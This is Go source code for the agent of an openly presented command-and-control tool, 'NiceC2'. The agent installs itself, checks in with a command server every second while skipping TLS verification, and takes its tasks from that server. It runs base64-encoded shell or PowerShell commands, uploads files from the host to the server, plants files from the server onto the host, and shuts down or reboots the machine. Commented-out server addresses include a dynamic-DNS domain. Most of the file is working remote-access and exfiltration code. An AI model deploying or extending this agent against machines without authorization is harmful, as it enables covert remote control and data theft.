package main

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"path"
	"time"

	// "io/ioutil"

	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"

	"github.com/denisbrodbeck/machineid"
	// "github.com/mitchellh/go-homedir"
)

// Setting the command server
// var command_server string = "https://192.168.0.69:8081"
// var command_server string = "https://root-27.duckdns.org:8081"

var command_server string = "https://localhost:8081"

// var command_server string = "http://192.168.0.29:8081"

// Variables assigned later
var NodeID string = "" // This will be a GUID at some point

// var transport *http.Transport

// var tlsConfig *tls.Config

type CheckIn struct {
	ID       string `json:"ID"`
	Hostname string `json: "Hostname"`
	Platform string `json:"Platform"`
}

type CheckIn_response struct {
	TaskID string `json:"taskID"`
	Task   string `json:"task"`
	Arg    string `json:"arg"`
}

type command struct {
	ID      string `json:"ID"`
	Command string `json:"command"`
	Details string `json:"details"`
}

type Task_Response struct {
	TaskID   string
	Progress string // Completed / Failed
	Result   string // Data from the task
}

// Checking errors
func check(e error) {
	if e != nil {
		panic(e)
	}
}

// global stuff for shortcuts
var p = fmt.Println

func main() {

	Banner := `
█████████████████████████████████████████████
   █████   ██████  ███████ ███    ██ ████████  
  ██   ██ ██       ██      ████   ██    ██    
  ███████ ██   ███ █████   ██ ██  ██    ██    
  ██   ██ ██    ██ ██      ██  ██ ██    ██    
  ██   ██  ██████  ███████ ██   ████    ██    
█████████████████████████████████████████████                                                                                                                                                                            
`

	// Installs the NiceC2 agent on the system
	// runs every time, but doesn't cause issues.
	start_installer()

	fmt.Println(Banner)

	NodeID, _ = machineid.ID()
	// NodeID = "test"

	// Cert stuff

	// AddCertToTrustStore("server.crt")

	// Load the server certificate
	// certFile := "server.crt"
	// certBytes, err := ioutil.ReadFile(certFile)
	// if err != nil {
	// 	fmt.Println(err)
	// }
	// certPool := x509.NewCertPool()
	// if ok := certPool.AppendCertsFromPEM(certBytes); !ok {
	// 	// handle error
	// 	fmt.Println("can't do something with the cert")
	// }

	// // Create the tls.Config object with the server certificate
	// tlsConfig = &tls.Config{
	// 	RootCAs: certPool,
	// }

	// // Create a transport that uses the client's truststore to verify the server's certificate
	// transport = &http.Transport{
	// 	TLSClientConfig: &tls.Config{
	// 		RootCAs: func() *x509.CertPool {
	// 			certPool := x509.NewCertPool()
	// 			certFile, err := os.Open("server.crt")
	// 			if err != nil {
	// 				log.Fatal(err)
	// 			}
	// 			defer certFile.Close()
	// 			certBytes, err := ioutil.ReadAll(certFile)
	// 			if err != nil {
	// 				log.Fatal(err)
	// 			}
	// 			certPool.AppendCertsFromPEM(certBytes)
	// 			return certPool
	// 		}(),
	// 	},
	// }

	// Checks in every 10 seconds.
	for {
		time.Sleep(1 * time.Second)
		checkIn()
	}

}

func send_response(response_to_task Task_Response) {
	// This allows us to use a self signed certificate.
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	// This seems very wrong. But seems to work
	data := map[string]string{"TaskID": response_to_task.TaskID, "Progress": response_to_task.Progress, "Result": response_to_task.Result}

	json_data, err := json.Marshal(data)
	if err != nil {
		log.Fatal(err)
	}

	r, err := http.NewRequest("POST", command_server+"/node_response", bytes.NewBuffer(json_data))
	if err != nil {
		// panic(err)
		fmt.Println("Error sending the commands response back")
	}

	// Add the header to say that it's json
	r.Header.Add("Content-Type", "application/json")

	//Create a client to send the data and then send it
	client := &http.Client{}
	res, err := client.Do(r)
	if err != nil {
		// panic(err)
		fmt.Println("Error sending the commands response back")
	}

	fmt.Println(res.Body)

}

func checkIn() {

	// This allows us to use a self signed certificate.
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	// Getting the info
	hostname, _ := os.Hostname()
	platform := runtime.GOOS

	data := map[string]string{"ID": NodeID, "Hostname": hostname, "Platform": platform}

	json_data, err := json.Marshal(data)
	if err != nil {
		// log.Fatal(err)
		fmt.Println("error Marshalling the JSON sent by the server")
	}

	r, err := http.NewRequest("POST", command_server+"/checkin", bytes.NewBuffer(json_data))
	if err != nil {
		fmt.Println("Error posting to command server")
		return
	}

	// Add the header to say that it's json
	r.Header.Add("Content-Type", "application/json")

	//Create a client to send the data and then send it
	client := &http.Client{}
	res, err := client.Do(r)
	if err != nil {
		fmt.Println("Error sending data back to command server")
		return
	}
	defer res.Body.Close()

	// Checks to make sure the server is the one that's expected
	// If it's not the one that is expected, ignore the response
	result := verifyServerCert(res, "server.crt")
	if result != true {
		fmt.Println("SERVER CERTIFICATES DO NOT MATCH")
		return
	}

	// Bit of UI for you
	if res.StatusCode == 200 {
		// fmt.Println("Response was OK")
	} else {
		fmt.Println("Response was Not OK")
	}

	fmt.Println(res.StatusCode)

	post := &CheckIn_response{}
	derr := json.NewDecoder(res.Body).Decode(post)
	if derr != nil {
		fmt.Println("Error decoding the JSON")
		panic(derr)
	}

	// Handeling it if there is no new task
	if post.TaskID == "0" {
		// fmt.Println("No new task")
		return
	}

	fmt.Println("Details of response")
	fmt.Println("Task: " + post.Task)
	fmt.Println("Arg: " + post.Arg)

	// This is is where the tasks that the node should then do need to go
	switch post.Task {
	case "run script":
		fmt.Println("Hello there")
	case "shutdown":
		shutdown(post.TaskID)
	case "reboot":
		reboot(post.TaskID)
	case "run command":
		go handle_runCommand(post.TaskID, post.Arg)
	case "send-file":
		go handle_send_file(post.TaskID, post.Arg)
	case "get-file":
		go get_file(post.TaskID, post.Arg)
	default:
		// Well if it doesn't match 🤷‍♀️

	}

}

// Function for shutting down PC
func shutdown(task_id string) error {

	var response Task_Response

	response = Task_Response{task_id, "Success", "Shutdown Command Received"}

	switch os := runtime.GOOS; os {
	case "linux":
		send_response(response)
		out, err := exec.Command("shutdown", "-h", "now").Output()
		if err != nil {
			response = Task_Response{task_id, "Failed", string(out)}
			send_response(response)
			return err
		}
	case "darwin":
		send_response(response)
		out, err := exec.Command("shutdown", "-h", "now").Output()
		if err != nil {
			response = Task_Response{task_id, "Failed", string(out)}
			send_response(response)
			return err
		}
	case "windows":
		send_response(response)
		out, err := exec.Command("shutdown", "/s", "/t", "0").Output()
		if err != nil {
			response = Task_Response{task_id, "Failed", string(out)}
			send_response(response)
			return err
		}
	default:
		fmt.Println("shutdown failed")
	}

	response = Task_Response{task_id, "Failed", "Machine has not shutdown"}
	send_response(response)
	return errors.New("shutdown failed: Can't find platform")

}

func reboot(task_id string) error {

	var response Task_Response

	response = Task_Response{task_id, "Success", "Shutdown Command Received"}

	switch os := runtime.GOOS; os {
	case "linux":
		send_response(response)
		out, err := exec.Command("reboot").Output()
		if err != nil {
			response = Task_Response{task_id, "Failed", string(out)}
			send_response(response)
			return err
		}
	case "darwin":
		send_response(response)
		out, err := exec.Command("reboot").Output()
		if err != nil {
			response = Task_Response{task_id, "Failed", string(out)}
			send_response(response)
			return err
		}
	case "windows":
		send_response(response)
		out, err := exec.Command("shutdown", "/r", "/t", "0").Output()
		if err != nil {
			response = Task_Response{task_id, "Failed", string(out)}
			send_response(response)
			return err
		}
	default:
		fmt.Println("shutdown failed")
	}

	response = Task_Response{task_id, "Failed", "Machine has not shutdown"}
	send_response(response)
	return errors.New("shutdown failed: Can't find platform")

}

func handle_send_file(this_taskID string, args string) {

	parts := strings.Split(args, " || ")
	if len(parts) != 2 {

		response := Task_Response{this_taskID, "Failed", "unable to parse arguments"}
		send_response(response)
		// return errors.New("cant parse download argument")
	}

	filename := parts[0]
	destination := parts[1]

	fmt.Println("Filename: " + filename)
	fmt.Println("Destination: " + destination)

	// Update the server on progress
	response := Task_Response{this_taskID, "Progress", "Filename: " + filename}
	send_response(response)

	// Download the file
	err := send_file(filename, destination, this_taskID)
	if err != nil {

		// response := Task_Response{this_taskID, "Failed", "Could not retrieve the file from the server."}
		// send_response(response)
		fmt.Println("Error retrieving file from server:", err)
		return
	}

}

func get_file(this_taskID string, filepath string) error {

	if _, err := os.Stat(filepath); errors.Is(err, os.ErrNotExist) {
		// path/to/whatever does not exist

		response := Task_Response{this_taskID, "Failed", "Can't find the file"}
		send_response(response)
	}

	file, err := os.Open(filepath)
	if err != nil {
		return err
		response := Task_Response{this_taskID, "Failed", "Can't open the file"}
		send_response(response)

	}
	defer file.Close()

	body := new(bytes.Buffer)
	writer := multipart.NewWriter(body)

	filename := path.Base(filepath)

	// Create a form field with the file name
	part, err := writer.CreateFormFile("file", filename)
	if err != nil {
		return err
	}

	// Copy the file contents to the form field
	_, err = io.Copy(part, file)
	if err != nil {
		return err
	}

	// Close the multipart writer
	err = writer.Close()
	if err != nil {
		return err
	}

	// Create a new request with the multipart body
	req, err := http.NewRequest("POST", command_server+"/get_file", body)
	if err != nil {

		fmt.Println("Can't creatr a new request")
		response := Task_Response{this_taskID, "Failed", "Can't creat new request with the multipart body"}
		send_response(response)

		return err
	}

	// Set the Content-Type header to the multipart boundary
	req.Header.Set("Content-Type", writer.FormDataContentType())

	// Send the request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {

			// fmt.Println("failed to get-file file " + string(resp.StatusCode))
			fmt.Println(resp.StatusCode)

			response := Task_Response{this_taskID, "Failed", "failed to get file " + string(resp.StatusCode)}
			send_response(response)
			return fmt.Errorf("Failed to get file. Status code: %d", resp.StatusCode)

		}

		fmt.Println(resp.StatusCode)

		response := Task_Response{this_taskID, "Failed", "failed to get file " + string(resp.StatusCode)}
		send_response(response)
		return fmt.Errorf("Failed to get file. Status code: %d. Response body: %s", resp.StatusCode, string(body))
	}

	response := Task_Response{this_taskID, "Success", "File retrieved"}
	send_response(response)

	return nil
}

func send_file(filename string, filepath string, this_taskID string) error {

	// Create the file
	out, err := os.Create(filepath)
	if err != nil {

		// Handles if the user doesn't specify the file name in the thingy
		out, err = os.Create(filepath + filename)
		if err != nil {
			// Update the server on progress
			response := Task_Response{this_taskID, "Failed", "Can't create file at: " + filepath}
			send_response(response)
			return err

		}

	}
	defer out.Close()

	// Make the request
	resp, err := http.Get(command_server + "/send_file/" + filename)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Check the status code
	if resp.StatusCode != http.StatusOK {
		os.Remove(filepath) // if the file isn't found. remove the empty destination
		return fmt.Errorf("failed to send the file to node: %s", resp.Status)
	}

	// Write the body to file in chunks
	buf := make([]byte, 1024*1024) // 1MB buffer
	for {
		n, err := resp.Body.Read(buf)
		if err != nil && err != io.EOF {
			return err
		}
		if n == 0 {
			break
		}

		_, err = out.Write(buf[:n])
		if err != nil {
			return err
		}
	}

	// Update the server on progress
	response := Task_Response{this_taskID, "Success!", "Filename: " + filename}
	send_response(response)

	return nil
}

// Runs a command based of a task. Then creates a response.
func handle_runCommand(this_taskID string, command string) {

	var response Task_Response

	// Decode the command
	decoded_command, err := base64.StdEncoding.DecodeString(command)
	if err != nil {
		fmt.Println("Error decoding base64:", err)
		response = Task_Response{this_taskID, "failed", "Couldn't decode the string"}
		send_response(response)
		return

	}

	output, command_error_message := runCommand(string(decoded_command))
	if command_error_message != "" {
		response = Task_Response{this_taskID, "failed", output}
	} else {
		response = Task_Response{this_taskID, "complete", output}
	}

	send_response(response)

}

// Runs a command, and returns the output.
func runCommand(command string) (outString string, errorMessage string) {

	var shell string
	errorMessage = ""

	// Selecting which shell to use
	if runtime.GOOS == "windows" {
		shell = "powershell.exe"
	} else {
		shell = "sh"
	}

	// Change directory
	if strings.HasPrefix(command, "cd ") {

		dir := command[3:] // get the first three chars

		os.Chdir(dir)

		p(dir)

		// run command, and if it causes an error create an error
		out, err := exec.Command(shell, "-c", "pwd").Output()
		if err != nil {
			p(err.Error())
			// errorMessage = err.Error()
			errorMessage = "There was an error executing. "

			return
		}

		outString = string(out)
		return
	}

	// run command, and if it causes an error create an error
	out, err := exec.Command(shell, "-c", command).Output()
	if err != nil {

		fmt.Println("There was an error. Ohh dear")
		p(err.Error())
		errorMessage = "There was an error running the command"

		return
	}

	outString = string(out)

	return

}

// // Converts an encoded script. To a script on the machine
// func script_to_file(input string) {

// 	f, err := os.Create("payloads/shell.sh")

// 	if err != nil {
// 		log.Fatal(err)
// 	}

// 	defer f.Close()

// 	data := []byte(input)

// 	_, err2 := f.Write(data)

// 	if err2 != nil {
// 		log.Fatal(err2)
// 	}

// 	return
// }

// // Runs a script. Currently not OS agnostic
// func run_script(path_to_script string) (output string) {

// 	output = ""

// 	out, err := exec.Command("sh", path_to_script).Output()
// 	if err != nil {
// 		fmt.Println("Error executing script")
// 	}

// 	output = string(out)

// 	return output

// }

// structToJSON converts a struct to a JSON string
func structToJSON(v interface{}) (string, error) {
	// Marshal the struct into a JSON string
	jsonBytes, err := json.Marshal(v)
	if err != nil {
		return "", err
	}

	// Convert the JSON bytes to a striπng and return it
	return string(jsonBytes), nil
}

func verifyServerCert(resp *http.Response, filePath string) bool {
	// Load the certificate from the file
	certFile, err := ioutil.ReadFile(filePath)
	if err != nil {
		return false
	}

	// Parse the certificate PEM block
	certPEM, _ := pem.Decode(certFile)
	if certPEM == nil {
		return false
	}

	// Parse the certificate
	cert, err := x509.ParseCertificate(certPEM.Bytes)
	if err != nil {
		return false
	}

	// Calculate the SHA256 fingerprint of the certificate
	certFingerprint := sha256.Sum256(cert.Raw)

	// Get the SHA256 fingerprint of the certificate from the response
	respFingerprint := sha256.Sum256(resp.TLS.PeerCertificates[0].Raw)

	// Compare the fingerprints
	return certFingerprint == respFingerprint
}
